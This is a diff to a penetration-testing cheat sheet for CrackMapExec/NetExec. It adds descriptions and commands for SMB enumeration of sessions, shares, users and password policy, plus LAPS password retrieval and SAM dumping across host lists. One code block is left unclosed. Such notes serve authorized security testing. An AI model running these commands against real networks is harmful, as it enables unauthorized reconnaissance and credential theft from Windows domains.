@@ -293,17 +293,39 @@ proxychains4 -q nxc smb $IP -u [user] -p [pass] -M drop-sc -o CLEANUP=True FILEN
 |Command|Description|
 |-------|-----------|
 |`crackmapexec smb <target> -u <u> -p <p> --loggedon-users`|Enumerate logged on users on the target|
-|`crackmapexec smb <target> -u <u> -p <p> --sessions`||
-|`crackmapexec smb <target> -u <u> -p <p> --disks`||
-|`crackmapexec smb <target> -u <u> -p <p> --computers`||
-|`crackmapexec smb <target> -u <u> -p <p> --wmi`||
-|`crackmapexec smb <target> -u <u> -p <p> --wmi-namespace`||
-|`crackmapexec smb <target> -u <u> -p <p> --rid-brute'||
-|`crackmapexec smb <target> -u <u> -p <p> --local-groups`||
-|`crackmapexec smb <target> -u <u> -p <p> --shares`||
-|`crackmapexec smb <target> -u <u> -p <p> --users'||
-|`crackmapexec smb <target> -u <u> -p <p> --groups`||
-|`crackmapexec smb <target> -u <u> -p <p> --pass-pol`||
+|`crackmapexec smb <target> -u <u> -p <p> --sessions`|Enumerate active sessions on the target|
+|`crackmapexec smb <target> -u <u> -p <p> --disks`|Enumerate disks on the target|
+|`crackmapexec smb <target> -u <u> -p <p> --computers`|Enumerate computer on the target domain|
+|`crackmapexec smb <target> -u <u> -p <p> --wmi`|Issues the specified WMI query|
+|`crackmapexec smb <target> -u <u> -p <p> --wmi-namespace`|WMI Namespace (default: root\cimv2)|
+|`crackmapexec smb <target> -u <u> -p <p> --rid-brute`|Enumerate users by bruteforcing the RID on the target|
+|`crackmapexec smb <target> -u <u> -p <p> --local-groups`|Enumerate local groups, if a group is specified then its members are enumerated|
+|`crackmapexec smb <target> -u <u> -p <p> --shares`|Enumerate permissions on all shares of the target|
+|`crackmapexec smb <target> -u <u> -p <p> --users`|Enumerate domain users on the target|
+|`crackmapexec smb <target> -u <u> -p <p> --groups`|Enumerate domain groups on the target|
+|`crackmapexec smb <target> -u <u> -p <p> --pass-pol`|Password policy of the domain|
+### Enumerate active sessions / logged on users on a target machine
+* Enumerate just logged on users
+```bash
+nxc smb $IP -u [user] -p [pass] --loggedon-users
+```
+* Check if a particular user is logged on
+```bash
+nxc smb $IP -u [user] -p [pass] --loggedon-users-filter [user]
+```
+* Check for a user session (not logged in but accessing the computer with credentials)
+```bash
+nxc smb $IP -u [user] -p [pass] --sessions
+### Enumerate LAPS
+> Local Administrator Password Solution
+```bash
+nxc ldap $FQDN -u [user] -p [pass] -M laps
+```
+> Even if this user doens't have LAPS access, it will tell you who does.
+* Run laps on multiple hosts and dumping sam
+```bash
+nxc smb [host list .txt] -u [user] -p [pass] --laps --sam
+```
 
 ## Remote Shell
 
